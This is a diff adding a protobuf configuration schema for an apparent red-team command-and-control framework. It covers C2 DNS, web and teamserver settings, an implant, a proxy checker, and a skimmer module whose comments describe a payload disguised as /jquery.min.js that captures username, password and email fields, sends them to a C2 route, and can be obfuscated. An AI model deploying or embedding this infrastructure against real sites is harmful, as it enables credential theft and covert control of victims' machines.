@@ -1,0 +1,132 @@
+syntax = "proto3";
+
+package c2;
+
+import "google/protobuf/wrappers.proto";
+
+message C2Config {
+  // the c2 domain, with authority to answer dns queries
+  string domain = 1;
+
+  // the bind ip of the dns server
+  string dns_ip = 2;
+  // the port of the dns server
+  uint32 dns_port = 3;
+
+  // the bind ip of the web server
+  string web_ip = 4;
+  // the port of the web server
+  uint32 web_port = 5;
+  // the external url of the web server: http://c2.redchannel.tld
+  // this will be the base of the binary_route
+  string web_url = 6;
+  // the route to serve the binary from on the web server
+  // ie: /payload.exe - agent code will be available at
+  // http://[web_ip]:[web_port]/payload.exe
+  string binary_route = 7;
+
+  // the bind ip of the teamserver
+  string ts_ip = 8;
+  // the port of the teamserver
+  uint32 ts_port = 9;
+
+  // enable debug mode
+  bool debug = 10;
+
+  // a map of <operator, password> with access to the server
+  map<string, string> operators = 11;
+}
+
+message SkimmerModuleConfig {
+  // the route to serve the skimmer payload from on the c2 web server
+  // ie: /jquery.min.js - skimmer code will be available at
+  // http://[skimmer.url]/jquery.min.js
+  string payload_route = 1;
+
+  // the route to accept incoming skimmer data
+  // ie: /stats - skimmer will send data to http://[skimmer.url]/stats
+  string data_route = 2;
+
+  // the external url of the web server: http://c2.redchannel.tld -> [reverse
+  // proxy] -> http://[c2.web_ip]:[c2.web_port]/ this will be the base of the
+  // [payload_route] and [data_route]
+  string url = 3;
+
+  // the list of class names to help find elements to skim data
+  // ["passwordField", "mt-4"]
+  repeated string target_classes = 4;
+
+  // the list of ids to help find elements to skim data from
+  // ["username", "password", "email"]
+  repeated string target_ids = 5;
+
+  // should we obfuscate the skimmer payload
+  bool obfuscate_payload = 6;
+}
+
+message ProxyModuleConfig {
+  // enable the proxy checker
+  bool enabled = 1;
+  // the url of the proxy hosting the proxy payload
+  string url = 2;
+  // the proxy key shared by the user and the c2
+  string key = 3;
+  // how often to check in with the proxy for new data
+  uint32 interval = 4;
+  // should we obfuscate the payload
+  bool obfuscate_payload = 5;
+}
+
+message ImplantModuleConfig {
+  string resolver = 1;
+  uint32 interval = 2;
+  bool debug = 3;
+  string proxy_url = 4;
+  bool proxy_enabled = 5;
+  string proxy_key = 6;
+  bool throttle_sendq = 7;
+}
+
+message RedChannelConfig {
+  C2Config c2 = 1;
+  SkimmerModuleConfig skimmer = 2;
+  map<string, string> static_dns = 3;
+  ProxyModuleConfig proxy = 4;
+  ImplantModuleConfig implant = 5;
+};
+
+// this allows over the network, live updates of the config
+// we do not allow operators to modify every part of the config
+// so, some fields from the *Config messages are not available
+//
+// we also use google wrappers to differentiate between undefined and
+// defaults
+
+message UpdatedConfig {
+  message C2 { .google.protobuf.BoolValue debug = 1; }
+  message Implant {
+    .google.protobuf.UInt32Value interval = 1;
+    .google.protobuf.BoolValue debug = 2;
+    .google.protobuf.StringValue proxy_url = 3;
+    .google.protobuf.BoolValue proxy_enabled = 4;
+    .google.protobuf.StringValue proxy_key = 5;
+    .google.protobuf.BoolValue throttle_sendq = 6;
+  }
+  message Proxy {
+    .google.protobuf.BoolValue enabled = 1;
+    .google.protobuf.StringValue url = 2;
+    .google.protobuf.StringValue key = 3;
+    .google.protobuf.UInt32Value interval = 4;
+    .google.protobuf.BoolValue obfuscate_payload = 5;
+  }
+  message Skimmer {
+    repeated string target_classes = 1;
+    repeated string target_ids = 2;
+    .google.protobuf.BoolValue obfuscate_payload = 3;
+  }
+
+  C2 c2 = 1;
+  Proxy proxy = 2;
+  Implant implant = 3;
+  Skimmer skimmer = 4;
+}
